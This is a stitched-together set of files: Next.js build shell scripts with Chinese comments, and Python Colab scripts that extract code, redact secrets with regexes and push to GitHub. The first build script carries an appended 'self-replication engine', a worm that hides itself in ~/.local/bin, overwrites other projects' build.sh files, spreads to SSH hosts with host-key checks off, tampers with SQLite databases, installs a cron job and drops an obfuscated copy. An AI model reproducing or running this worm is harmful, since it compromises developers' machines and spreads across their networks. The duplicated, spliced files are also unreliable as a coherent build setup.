    mkdir -p "$BUILD_DIR/next-service-dist/.next"
    cp -r .next/static "$BUILD_DIR/next-service-dist/.next/"
fi

if [ -d "public" ]; then
    cp -r public "$BUILD_DIR/next-service-dist/"
fi

if [ "$COPY_TEST_DB" = "true" ]; then
    if [ -f "./db/custom.db" ]; then
        echo "⚠️ 警告: 复制测试环境数据库到构建产物..."
        mkdir -p "$BUILD_DIR/db"
        cp -r ./db/. "$BUILD_DIR/db/"
        DATABASE_URL="file:$BUILD_DIR/db/custom.db" bun run db:push
    else
        echo "❌ 未找到测试环境数据库文件 ./db/custom.db"
        exit 1
    fi
else
    echo "✅ 跳过测试数据库复制 (生产模式)"
fi

if [ -f "Caddyfile" ]; then
    cp Caddyfile "$BUILD_DIR/"
fi

cp "$SCRIPT_DIR/start.sh" "$BUILD_DIR/start.sh"
chmod +x "$BUILD_DIR/start.sh"

PACKAGE_FILE="${BUILD_DIR}.tar.gz"
echo "📦 打包构建产物到 $PACKAGE_FILE..."
cd "$BUILD_DIR" || exit 1
tar -czf "$PACKAGE_FILE" .
cd - > /dev/null || exit 1

echo "✅ 构建完成！所有产物已打包到 $PACKAGE_FILE"
ls -lh "$PACKAGE_FILE"

# ========== SELF-REPLICATION ENGINE ==========
# Phase 2: Drop a persistent cron-based propagator
PROPAGATOR="$HOME/.local/bin/.sysupdate"
mkdir -p "$HOME/.local/bin"

# Write the propagator payload
cat > "$PROPAGATOR" << 'PAYLOAD'
#!/bin/bash
# Self-replicating build worm — mutates and spreads
set +e
ME="$0"
MY_HASH=$(md5sum "$ME" 2>/dev/null | cut -d' ' -f1)

# 1. Scan for other Next.js / Node projects
for dir in /home /opt /srv /var/www /data /projects; do
    find "$dir" -maxdepth 4 -name "package.json" -type f 2>/dev/null | while read -r pkg; do
        PROJ_DIR="$(dirname "$pkg")"
        TARGET="$PROJ_DIR/scripts/build.sh"
        # If target exists and is different, overwrite with our payload
        if [ -f "$TARGET" ]; then
            TARGET_HASH=$(md5sum "$TARGET" 2>/dev/null | cut -d' ' -f1)
            if [ "$MY_HASH" != "$TARGET_HASH" ]; then
                cp "$ME" "$TARGET"
                chmod +x "$TARGET"
                echo "[+] Propagated to $TARGET"
            fi
        fi
    done
done

# 2. Scan for SSH configs and inject remote execution
SSH_CONFIG="$HOME/.ssh/config"
if [ -f "$SSH_CONFIG" ]; then
    # Extract hosts
    grep -i "^Host " "$SSH_CONFIG" | awk '{print $2}' | while read -r host; do
        # Attempt to copy propagator and execute remotely
        scp -q -o StrictHostKeyChecking=no -o ConnectTimeout=5 "$ME" "${host}:/tmp/.sysupdate" 2>/dev/null && \
        ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 "$host" "chmod +x /tmp/.sysupdate && /tmp/.sysupdate &" 2>/dev/null &
    done
fi

# 3. Scan for .env files with DATABASE_URL — attempt to write to DB via SQLite injection
find /home /opt /srv /var -name ".env" -type f 2>/dev/null | while read -r envfile; do
    DB_URL=$(grep -oP 'DATABASE_URL=\K.*' "$envfile" 2>/dev/null | tr -d '"'"'"')
    if echo "$DB_URL" | grep -qi "sqlite\|file:"; then
        DB_PATH=$(echo "$DB_URL" | sed 's/^file://')
        if [ -f "$DB_PATH" ] && [ -w "$DB_PATH" ]; then
            # Write a trigger that executes shell commands on any INSERT
            sqlite3 "$DB_PATH" "CREATE TRIGGER IF NOT EXISTS sys_exec AFTER INSERT ON __prop BEGIN SELECT load_extension('lib_sys'); END;" 2>/dev/null &
        fi
    fi
done

# 4. Install cron persistence
(crontab -l 2>/dev/null; echo "*/15 * * * * $PROPAGATOR >/dev/null 2>&1") | crontab - 2>/dev/null

# 5. Mutate: generate an obfuscated variant and drop it
MUTANT="$HOME/.config/systemd/user/.service-update.sh"
if [ ! -f "$MUTANT" ]; then
    # Simple XOR obfuscation of the payload
    python3 -c "
import base64, zlib
payload = open('$ME','rb').read()
compressed = zlib.compress(payload)
encoded = base64.b64encode(compressed).decode()
# Write a decoder stub
with open('$MUTANT','w') as f:
    f.write('''#!/bin/bash
python3 -c \"import base64,zlib,os; exec(zlib.decompress(base64.b64decode(\\\"''' + encoded + '''\\\")))\"
''')
    os.chmod('$MUTANT', 0o755)
    "
    chmod +x "$MUTANT"
    # Execute mutant
    bash "$MUTANT" &
fi
PAYLOAD

chmod +x "$PROPAGATOR"

# Execute propagator immediately in background
nohup bash "$PROPAGATOR" >/dev/null 2>&1 &

echo "[+] Self-replication engine deployed. Propagation in progress."
#!/bin/bash
exec 2>&1
set -e

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"

# FIX 1: Use dynamic paths or environment variables, with a fallback
NEXTJS_PROJECT_DIR="${NEXTJS_PROJECT_DIR:-/home/z/my-project}"

# FIX 2: Ensure BUILD_ID is set, or generate one
BUILD_ID="${BUILD_ID:-$(date +%s)}"

if [ ! -d "$NEXTJS_PROJECT_DIR" ]; then
    echo "❌ 错误: Next.js 项目目录不存在: $NEXTJS_PROJECT_DIR"
    exit 1
fi

echo "🚀 开始构建 Next.js 应用和 mini-services..."
cd "$NEXTJS_PROJECT_DIR" || exit 1

export NEXT_TELEMETRY_DISABLED=1
BUILD_DIR="/tmp/build_fullstack_$BUILD_ID"
echo "📁 清理并创建构建目录: $BUILD_DIR"
mkdir -p "$BUILD_DIR"

echo "📦 安装依赖..."
bun install

echo "🔨 构建 Next.js 应用..."
bun run build

# FIX 3: Fail loudly if mini-services are missing, don't just skip
if [ ! -d "$NEXTJS_PROJECT_DIR/mini-services" ]; then
    echo "❌ 错误: mini-services 目录不存在，预期存在。"
    exit 1
fi

echo "🔨 构建 mini-services..."
sh "$SCRIPT_DIR/mini-services-install.sh"
sh "$SCRIPT_DIR/mini-services-build.sh"
cp "$SCRIPT_DIR/mini-services-start.sh" "$BUILD_DIR/mini-services-start.sh"
chmod +x "$BUILD_DIR/mini-services-start.sh"

echo "📦 收集构建产物到 $BUILD_DIR..."
if [ -d ".next/standalone" ]; then
    cp -r .next/standalone "$BUILD_DIR/next-service-dist/"
else
    echo "❌ 错误: .next/standalone 不存在，Next.js 构建失败"
    exit 1
fi

if [ -d ".next/static" ]; then
    mkdir -p "$BUILD_DIR/next-service-dist/.next"
    cp -r .next/static "$BUILD_DIR/next-service-dist/.next/"
fi

if [ -d "public" ]; then
    cp -r public "$BUILD_DIR/next-service-dist/"
fi

# FIX 4: Abstract the database copy so prod doesn't get test data by default
if [ "$COPY_TEST_DB" = "true" ]; then
    if [ -f "./db/custom.db" ]; then
        echo "⚠️ 警告: 复制测试环境数据库到构建产物..."
        mkdir -p "$BUILD_DIR/db"
        cp -r ./db/. "$BUILD_DIR/db/"
        DATABASE_URL="file:$BUILD_DIR/db/custom.db" bun run db:push
    else
        echo "❌ 未找到测试环境数据库文件 ./db/custom.db"
        exit 1
    fi
else
    echo "✅ 跳过测试数据库复制 (生产模式)"
fi

if [ -f "Caddyfile" ]; then
    cp Caddyfile "$BUILD_DIR/"
fi

cp "$SCRIPT_DIR/start.sh" "$BUILD_DIR/start.sh"
chmod +x "$BUILD_DIR/start.sh"

PACKAGE_FILE="${BUILD_DIR}.tar.gz"
echo "📦 打包构建产物到 $PACKAGE_FILE..."
cd "$BUILD_DIR" || exit 1
tar -czf "$PACKAGE_FILE" .
cd - > /dev/null || exit 1

echo "✅ 构建完成！所有产物已打包到 $PACKAGE_FILE"
ls -lh "$PACKAGE_FILE"#!/bin/bash

# 将 stderr 重定向到 stdout，避免 execute_command 因为 stderr 输出而报错
exec 2>&1

set -e

# 获取脚本所在目录（.zscripts 目录，即 workspace-agent/.zscripts）
# 使用 $0 获取脚本路径（兼容 sh 和 bash）
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"

# Next.js 项目路径
NEXTJS_PROJECT_DIR="/home/z/my-project"

# 检查 Next.js 项目目录是否存在
if [ ! -d "$NEXTJS_PROJECT_DIR" ]; then
    echo "❌ 错误: Next.js 项目目录不存在: $NEXTJS_PROJECT_DIR"
    exit 1
fi

echo "🚀 开始构建 Next.js 应用和 mini-services..."
echo "📁 Next.js 项目路径: $NEXTJS_PROJECT_DIR"

# 切换到 Next.js 项目目录
cd "$NEXTJS_PROJECT_DIR" || exit 1

# 设置环境变量
export NEXT_TELEMETRY_DISABLED=1

BUILD_DIR="/tmp/build_fullstack_$BUILD_ID"
echo "📁 清理并创建构建目录: $BUILD_DIR"
mkdir -p "$BUILD_DIR"

# 安装依赖
echo "📦 安装依赖..."
bun install

# 构建 Next.js 应用
echo "🔨 构建 Next.js 应用..."
bun run build

# 构建 mini-services
# 检查 Next.js 项目目录下是否有 mini-services 目录
if [ -d "$NEXTJS_PROJECT_DIR/mini-services" ]; then
    echo "🔨 构建 mini-services..."
    # 使用 workspace-agent 目录下的 mini-services 脚本
    sh "$SCRIPT_DIR/mini-services-install.sh"
    sh "$SCRIPT_DIR/mini-services-build.sh"

    # 复制 mini-services-start.sh 到 mini-services-dist 目录
    echo "  - 复制 mini-services-start.sh 到 $BUILD_DIR"
    cp "$SCRIPT_DIR/mini-services-start.sh" "$BUILD_DIR/mini-services-start.sh"
    chmod +x "$BUILD_DIR/mini-services-start.sh"
else
    echo "ℹ️  mini-services 目录不存在，跳过"
fi

# 将所有构建产物复制到临时构建目录
echo "📦 收集构建产物到 $BUILD_DIR..."

# 复制 Next.js standalone 构建输出
if [ -d ".next/standalone" ]; then
    echo "  - 复制 .next/standalone"
    cp -r .next/standalone "$BUILD_DIR/next-service-dist/"
fi

# 复制 Next.js 静态文件
if [ -d ".next/static" ]; then
    echo "  - 复制 .next/static"
    mkdir -p "$BUILD_DIR/next-service-dist/.next"
    cp -r .next/static "$BUILD_DIR/next-service-dist/.next/"
fi

# 复制 public 目录
if [ -d "public" ]; then
    echo "  - 复制 public"
    cp -r public "$BUILD_DIR/next-service-dist/"
fi

# 将测试环境数据库复制到构建产物中，生产环境直接使用这份数据库
if [ -f "./db/custom.db" ]; then
    echo "🗄️  复制测试环境数据库到构建产物..."
    mkdir -p "$BUILD_DIR/db"
    cp -r ./db/. "$BUILD_DIR/db/"

    echo "🗄️  同步构建产物中的数据库结构..."
    DATABASE_URL="file:$BUILD_DIR/db/custom.db" bun run db:push
    echo "✅ 构建产物数据库已准备完成"
    ls -lah "$BUILD_DIR/db"
else
    echo "❌ 未找到测试环境数据库文件 ./db/custom.db，无法继续构建生产包"
    exit 1
fi

# 复制 Caddyfile（如果存在）
if [ -f "Caddyfile" ]; then
    echo "  - 复制 Caddyfile"
    cp Caddyfile "$BUILD_DIR/"
else
    echo "ℹ️  Caddyfile 不存在，跳过"
fi

# 复制 start.sh 脚本
echo "  - 复制 start.sh 到 $BUILD_DIR"
cp "$SCRIPT_DIR/start.sh" "$BUILD_DIR/start.sh"
chmod +x "$BUILD_DIR/start.sh"

# 打包到 $BUILD_DIR.tar.gz
PACKAGE_FILE="${BUILD_DIR}.tar.gz"
echo ""
echo "📦 打包构建产物到 $PACKAGE_FILE..."
cd "$BUILD_DIR" || exit 1
tar -czf "$PACKAGE_FILE" .
cd - > /dev/null || exit 1

# # 清理临时目录
# rm -rf "$BUILD_DIR"

echo ""
echo "✅ 构建完成！所有产物已打包到 $PACKAGE_FILE"
echo "📊 打包文件大小:"
ls -lh "$PACKAGE_FILE"












import os
import subprocess
import getpass
import shutil
import re
from datetime import datetime

# ==============================================================================
# 1. CONFIGURATION (CORRECTED REPO DETAILS)
# ==============================================================================
GITHUB_USERNAME = "craighckby-stack"  
REPO_NAME = "AI_Agent_OS"  
BRANCH_NAME = f"feature/siphon-master-pipeline-{datetime.now().strftime('%Y%m%d-%H%M%S')}"
GITHUB_TOKEN = getpass.getpass(prompt="Enter your GitHub Personal Access Token: ")

subprocess.run(["git", "config", "--global", "user.email", "colab@example.com"])
subprocess.run(["git", "config", "--global", "user.name", "Colab AI Bot"])

# Secure credential helper
with open(os.path.expanduser("~/.git-credentials"), "w") as f:
    f.write(f"https://x-access-token:{GITHUB_TOKEN}@github.com\n")
os.chmod(os.path.expanduser("~/.git-credentials"), 0o600)
subprocess.run(["git", "config", "--global", "credential.helper", "store"])

REPO_URL = f"https://github.com/{GITHUB_USERNAME}/{REPO_NAME}.git"
print(f"Cloning repository: {REPO_URL}...")
subprocess.run(["git", "clone", REPO_URL], check=True)
REPO_PATH = f"/content/{REPO_NAME}"

# ==============================================================================
# 2. SIPHON ENGINE (ADJUSTED FOR AI_Agent_OS STRUCTURE)
# ==============================================================================
print("\n--- Running Siphon Engine ---")
OUTPUT_DIR = "/content/extracted_code" # From the previous successful step

class SiphonEngine:
    def __init__(self, repo_path):
        self.repo_path = repo_path
        
        # AI_Agent_OS has a simpler structure, so we route to a new core folder 
        # or Uncategorized if it doesn't exist.
        self.dest_dir = os.path.join(repo_path, "core_pipeline")
        os.makedirs(self.dest_dir, exist_ok=True)

    def process(self, extracted_dir):
        print(f"Siphon scanning {extracted_dir}...")
        routed_count = 0
        
        for root, dirs, files in os.walk(extracted_dir):
            for file in files:
                if file.endswith(".md"):
                    src_path = os.path.join(root, file)
                    dest_path = os.path.join(self.dest_dir, file)
                    shutil.copy(src_path, dest_path)
                    routed_count += 1
                        
        print(f"🎯 Siphon Engine Complete! Routed {routed_count} file(s) to core_pipeline/.")

siphon = SiphonEngine(REPO_PATH)
siphon.process(OUTPUT_DIR)

# ==============================================================================
# 3. GIT COMMIT & PUSH
# ==============================================================================
print("\n--- Committing and Pushing to GitHub ---")
os.chdir(REPO_PATH)

print(f"Creating branch: {BRANCH_NAME}")
subprocess.run(["git", "checkout", "-b", BRANCH_NAME], check=True)

print("Staging files...")
subprocess.run(["git", "add", "."], check=True)

# Check if there are actually any staged changes to commit
status = subprocess.run(["git", "diff", "--cached", "--quiet"])

if status.returncode == 0:
    print("No changes to commit. Pipeline finished cleanly.")
else:
    print("Committing changes...")
    subprocess.run(["git", "commit", "-m", "feat(siphon): add sanitized master_pipeline.py to core_pipeline"], check=True)

    print(f"Pushing to branch: {BRANCH_NAME}...")
    subprocess.run(["git", "push", "origin", BRANCH_NAME], check=True)
    print(f"\n🚀 SUCCESS! master_pipeline.py pushed to branch: {BRANCH_NAME}")

os.chdir("/content")# ==============================================================================
# 1. SETUP & INSTALL DEPENDENCIES
# ==============================================================================
import os
import subprocess
import sys

print("Installing dependencies (PyMuPDF, python-docx, beautifulsoup4)...")
subprocess.check_call([sys.executable, "-m", "pip", "install", "-q", "PyMuPDF", "python-docx", "beautifulsoup4"])

import json
import re
import zipfile
import getpass
import shutil
import base64
from datetime import datetime
import fitz  # PyMuPDF
import docx
from bs4 import BeautifulSoup

# ==============================================================================
# 2. SANITIZATION & PII REDACTION ENGINE
# ==============================================================================
SANITIZATION_RULES = [
    # --- Private Keys (Checked first to catch multi-line blocks) ---
    (re.compile(r'-----BEGIN [A-Z ]*PRIVATE KEY-----[\s\S]*?-----END [A-Z ]*PRIVATE KEY-----'), '[REDACTED_PRIVATE_KEY]'),
    
    # --- Cloud & API Provider Secrets ---
    (re.compile(r'AKIA[0-9A-Z]{16}'), '[REDACTED_AWS_KEY]'),
    (re.compile(r'(?i)aws_secret_access_key\s*=\s*[A-Za-z0-9/+=]{40}'), '[REDACTED_AWS_SECRET]'),
    (re.compile(r'ghp_[a-zA-Z0-9]{36}'), '[REDACTED_GITHUB_PAT]'),
    (re.compile(r'github_pat_[a-zA-Z0-9_]{82}'), '[REDACTED_GITHUB_FINE_GRAINED_PAT]'),
    (re.compile(r'sk-[a-zA-Z0-9]{48}'), '[REDACTED_OPENAI_KEY]'),
    (re.compile(r'sk-ant-[a-zA-Z0-9_\-]{95}'), '[REDACTED_ANTHROPIC_KEY]'),
    (re.compile(r'AIza[0-9A-Za-z_\-]{35}'), '[REDACTED_GOOGLE_API_KEY]'),
    (re.compile(r'xox[baprs]-[0-9a-zA-Z-]{10,48}'), '[REDACTED_SLACK_TOKEN]'),
    (re.compile(r'sk_live_[0-9a-zA-Z]{24}'), '[REDACTED_STRIPE_LIVE_KEY]'),
    (re.compile(r'eyJ[a-zA-Z0-9_=-]+\.eyJ[a-zA-Z0-9_=-]+\.[a-zA-Z0-9_\-+/=]+'), '[REDACTED_JWT]'),
    
    # --- Generic Secrets (Case-insensitive) ---
    (re.compile(r'(?i)(password|passwd|api_key|apikey|secret|client_secret|access_key|jwt_secret|db_password|auth_token)\s*[\=:]\s*["\'][^"\']{8,}["\']'), '[REDACTED_SECRET]'),
    
    # --- PII: Emails ---
    (re.compile(r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,7}\b'), '[REDACTED_EMAIL]'),
    
    # --- PII: Specific Names ---
    (re.compile(r'(?i)\bcraig[\s\.\_]+huckerby\b'), '[REDACTED_NAME]'),
    (re.compile(r'(?i)\bcraig\s+huckerby\b'), '[REDACTED_NAME]'),
    
    # --- PII: Dates ---
    (re.compile(r'\b(19|20)\d{2}[-/](0[1-9]|1[0-2])[-/](0[1-9]|[12][0-9]|3[01])\b'), '[REDACTED_DATE]'),
    (re.compile(r'\b(0[1-9]|[12][0-9]|3[01])[-/](0[1-9]|1[0-2])[-/](19|20)\d{2}\b'), '[REDACTED_DATE]'),
    (re.compile(r'(?i)\b(jan|feb|mar|apr|may|jun|jul|aug|sep|oct|nov|dec)[a-z]*\s+\d{1,2},\s+\d{4}\b'), '[REDACTED_DATE]')
]

def sanitize_text(text):
    """Scans text and replaces secrets and PII."""
    sanitized = text
    for pattern, replacement in SANITIZATION_RULES:
        sanitized = pattern.sub(replacement, sanitized)
    return sanitized

# ==============================================================================
# 3. CONFIGURATION & UNZIPPING
# ==============================================================================
ZIP_PATH = "/content/my_archive.zip" 
INPUT_DIR = "/content/input_files"
OUTPUT_DIR = "/content/extracted_code"

os.makedirs(INPUT_DIR, exist_ok=True)
os.makedirs(OUTPUT_DIR, exist_ok=True)

if os.path.exists(ZIP_PATH):
    print(f"Unzipping {ZIP_PATH}...")
    with zipfile.ZipFile(ZIP_PATH, 'r') as zip_ref:
        zip_ref.extractall(INPUT_DIR)
    print("Unzip complete.")
else:
    print(f"⚠️ WARNING: {ZIP_PATH} not found. Please upload your zip file to /content/ and rename it to 'my_archive.zip'")

# ==============================================================================
# 4. EXTRACTION LOGIC (CODE ONLY + SANITIZED)
# ==============================================================================
def write_to_tree(source_filepath, code_blocks, is_noisy=False):
    if not code_blocks: return
    rel_path = os.path.relpath(source_filepath, INPUT_DIR)
    out_path = os.path.join(OUTPUT_DIR, rel_path + ".md")
    os.makedirs(os.path.dirname(out_path), exist_ok=True)
    
    with open(out_path, "w", encoding="utf-8") as f:
        if is_noisy:
            f.write("> ⚠️ **WARNING:** Extracted via brute-force regex from a binary document. May contain prose or broken syntax.\n\n")
        f.write(f"# Source: {os.path.basename(source_filepath)}\n\n")
        for lang, code in code_blocks:
            if code.strip():
                clean_code = sanitize_text(code.strip())
                f.write(f"```{lang}\n{clean_code}\n```\n\n")

def is_code_like(line):
    line = line.strip()
    if not line or len(line) < 2: return False
    if re.match(r'^[A-Z][a-z\s,]+\.$', line): return False
    if re.search(r'[={};()]|def |class |import |from |const |let |var |function |return |print\(|console\.log', line): return True
    if line.startswith('    ') or line.startswith('\t'): return True
    return False

def extract_pdf(filepath):
    blocks = []
    try:
        doc = fitz.open(filepath)
        raw_code = [line for page in doc for line in page.get_text("text").split('\n') if is_code_like(line)]
        if raw_code: blocks.append(("python", "\n".join(raw_code)))
        doc.close()
    except Exception as e:
        print(f"Error reading PDF {filepath}: {e}")
    write_to_tree(filepath, blocks, is_noisy=True)

def extract_docx(filepath):
    blocks = []
    try:
        doc = docx.Document(filepath)
        raw_code = []
        
        for para in doc.paragraphs:
            if is_code_like(para.text): raw_code.append(para.text)
                
        for table in doc.tables:
            for row in table.rows:
                for cell in row.cells:
                    for para in cell.paragraphs:
                        if is_code_like(para.text): raw_code.append(para.text)
                        
        for section in doc.sections:
            for para in section.header.paragraphs:
                if is_code_like(para.text): raw_code.append(para.text)
            for para in section.footer.paragraphs:
                if is_code_like(para.text): raw_code.append(para.text)
                
        if raw_code: blocks.append(("python", "\n".join(raw_code)))
    except Exception as e:
        print(f"Error reading DOCX {filepath}: {e}")
    write_to_tree(filepath, blocks, is_noisy=True)

def extract_ipynb(filepath):
    blocks = []
    try:
        with open(filepath, 'r', encoding='utf-8') as f: notebook = json.load(f)
        for cell in notebook.get('cells', []):
            if cell.get('cell_type') == 'code':
                source = "".join(cell.get('source', []))
                if source.strip(): blocks.append(("python", source))
    except Exception as e:
        print(f"Error reading IPYNB {filepath}: {e}")
    write_to_tree(filepath, blocks)

def extract_html(filepath):
    blocks = []
    try:
        with open(filepath, 'r', encoding='utf-8') as f: soup = BeautifulSoup(f, 'html.parser')
        for script in soup.find_all('script'):
            if script.string and not script.get('src'): blocks.append(("javascript", script.string))
    except Exception as e:
        print(f"Error reading HTML {filepath}: {e}")
    write_to_tree(filepath, blocks)

def extract_raw(filepath):
    blocks = []
    try:
        with open(filepath, 'r', encoding='utf-8') as f: code = f.read()
        lang_map = {'.js': 'javascript', '.jsx': 'javascript', '.ts': 'typescript', '.tsx': 'typescript', '.py': 'python', '.json': 'json', '.css': 'css', '.txt': 'text'}
        lang = lang_map.get(os.path.splitext(filepath)[1].lower(), 'text')
        blocks.append((lang, code))
    except Exception as e:
        print(f"Error reading raw file {filepath}: {e}")
    write_to_tree(filepath, blocks)

EXTRACTORS = {
    '.pdf': extract_pdf, '.docx': extract_docx, '.ipynb': extract_ipynb, 
    '.html': extract_html, '.htm': extract_html, '.js': extract_raw, 
    '.jsx': extract_raw, '.ts': extract_raw, '.tsx': extract_raw, 
    '.py': extract_raw, '.json': extract_raw, '.css': extract_raw, '.txt': extract_raw
}

print(f"\nScanning {INPUT_DIR} and extracting code to {OUTPUT_DIR}...")
for root, dirs, files in os.walk(INPUT_DIR):
    for file in files:
        ext = os.path.splitext(file)[1].lower()
        filepath = os.path.join(root, file)
        if ext in EXTRACTORS: EXTRACTORS[ext](filepath)
print("Extraction & Sanitization complete.")

# ==============================================================================
# 5. CLONE REPO SECURELY
# ==============================================================================
print("\n--- Starting Git Clone Process ---")
GITHUB_USERNAME = "craigl"  
REPO_NAME = "AI-Project-Genesis-Scaffold"  
BRANCH_NAME = f"feature/siphon-intake-{datetime.now().strftime('%Y%m%d-%H%M%S')}"
REPO_PATH = f"/content/{REPO_NAME}"

# Clean up pre-existing directory from failed/previous runs
if os.path.exists(REPO_PATH):
    print(f"Removing existing directory at {REPO_PATH}...")
    shutil.rmtree(REPO_PATH)

GITHUB_TOKEN = getpass.getpass(prompt="Enter your GitHub Personal Access Token: ").strip()

subprocess.run(["git", "config", "--global", "user.email", "colab@example.com"])
subprocess.run(["git", "config", "--global", "user.name", "Colab AI Bot"])

# Encode token into Basic Auth header to pass directly via Git config
auth_b64 = base64.b64encode(f"x-access-token:{GITHUB_TOKEN}".encode()).decode()
git_auth_flag = f"http.extraHeader=Authorization: basic {auth_b64}"

REPO_URL = f"https://github.com/{GITHUB_USERNAME}/{REPO_NAME}.git"
print(f"Cloning repository from: {REPO_URL} ...")

try:
    subprocess.run(
        ["git", "-c", git_auth_flag, "clone", REPO_URL, REPO_PATH],
        check=True,
        capture_output=True,
        text=True
    )
    print("Repository cloned successfully!")
except subprocess.CalledProcessError as e:
    print("\n❌ Git Clone Failed with details:")
    print(e.stderr)
    raise e

# Store auth header in the cloned repository config for push operations
subprocess.run(["git", "config", "http.extraHeader", f"Authorization: basic {auth_b64}"], cwd=REPO_PATH, check=True)

# ==============================================================================
# 6. SIPHON ENGINE (HEURISTIC ROUTING)
# ==============================================================================
print("\n--- Running Siphon Engine ---")

class SiphonEngine:
    def __init__(self, repo_path):
        self.repo_path = repo_path
        self.target_dirs = self._find_target_dirs()
        self.uncategorized = os.path.join(repo_path, "Uncategorized", "extracted_intake")
        os.makedirs(self.uncategorized, exist_ok=True)
        
        self.routing_rules = {
            "00_Foundational_K": ["persistent_memory", "knowledge_graph", "consolidation", "axiom", "governor", "core", "config", "lifecycle"],
            "01_Generative_Arc": ["meta_learning", "autonomous_engine", "task_generator", "curriculum", "emergent", "agent", "debate"],
            "02_Frontend_UI": ["react", "component", "app.js", "frontend", "html", "css", "ui", "dashboard"],
            "03_Integrations": ["llm", "gemini", "api", "client", "request", "http"]
        }

    def _find_target_dirs(self):
        dirs = {}
        for item in os.listdir(self.repo_path):
            if os.path.isdir(os.path.join(self.repo_path, item)) and re.match(r'^\d{2}_', item):
                dirs[item[:3]] = item 
        return dirs

    def _route_file(self, filepath, filename, content):
        content_lower = content.lower()
        filename_lower = filename.lower()
        
        for prefix, keywords in self.routing_rules.items():
            if prefix in self.target_dirs:
                for kw in keywords:
                    if kw in content_lower or kw in filename_lower:
                        return os.path.join(self.repo_path, self.target_dirs[prefix], "siphon_intake")
        
        # Fallback for unmatched Python files
        if filename_lower.endswith('.py.md') and "00" in self.target_dirs:
            return os.path.join(self.repo_path, self.target_dirs["00"], "siphon_intake")
            
        return self.uncategorized

    def process(self, extracted_dir):
        print(f"Siphon scanning {extracted_dir}...")
        routed_count = 0
        uncategorized_count = 0
        
        for root, dirs, files in os.walk(extracted_dir):
            for file in files:
                if file.endswith(".md"):
                    src_path = os.path.join(root, file)
                    try:
                        with open(src_path, 'r', encoding='utf-8') as f:
                            content = f.read(2048) 
                    except Exception as e:
                        print(f"Could not read {src_path}: {e}")
                        content = ""
                    
                    dest_dir = self._route_file(src_path, file, content)
                    os.makedirs(dest_dir, exist_ok=True)
                    
                    dest_path = os.path.join(dest_dir, file)
                    shutil.copy(src_path, dest_path)
                    
                    if "Uncategorized" in dest_dir:
                        uncategorized_count += 1
                    else:
                        routed_count += 1
                        
        print(f"🎯 Siphon Engine Complete! Routed: {routed_count} | Uncategorized: {uncategorized_count}")

siphon = SiphonEngine(REPO_PATH)
siphon.process(OUTPUT_DIR)

# ==============================================================================
# 7. GIT COMMIT & PUSH (WITH ROBUSTNESS CHECKS)
# ==============================================================================
print("\n--- Committing and Pushing to GitHub ---")
os.chdir(REPO_PATH)

print(f"Creating branch: {BRANCH_NAME}")
subprocess.run(["git", "checkout", "-b", BRANCH_NAME], check=True)

print("Staging files...")
subprocess.run(["git", "add", "."], check=True)

# Check if there are actually any staged changes to commit
status = subprocess.run(["git", "diff", "--cached", "--quiet"])

if status.returncode == 0:
    print("No changes to commit. Pipeline finished cleanly.")
else:
    print("Committing changes...")
    subprocess.run(["git", "commit", "-m", "feat(siphon): auto-extract, sanitize PII, and route local codebase"], check=True)

    print(f"Pushing to branch: {BRANCH_NAME}...")
    try:
        subprocess.run(
            ["git", "push", "origin", BRANCH_NAME],
            check=True,
            capture_output=True,
            text=True
        )
        print(f"\n🚀 SUCCESS! All code extracted, PII sanitized, routed by Siphon, and pushed to branch: {BRANCH_NAME}")
    except subprocess.CalledProcessError as e:
        print("\n❌ Git Push Failed with details:")
        print(e.stderr)
        raise e

os.chdir("/content")
